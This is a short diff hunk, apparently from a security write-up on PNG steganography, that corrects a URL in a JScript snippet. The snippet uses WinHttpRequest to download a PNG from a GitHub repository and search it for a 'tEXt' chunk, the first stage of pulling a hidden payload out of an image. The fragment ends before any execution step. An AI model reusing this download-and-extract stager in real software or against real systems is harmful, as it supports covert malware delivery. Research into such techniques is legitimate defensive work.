@@ -773,7 +773,7 @@ int main(int argc, char* argv[])
 ```
 h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 h.SetTimeouts(0, 0, 0, 0);
-h.Open("GET","https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png",false);
+h.Open("GET","https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png",false);
 h.Send();
 Data = h.ResponseText;
 x=Data.indexOf("tEXt");
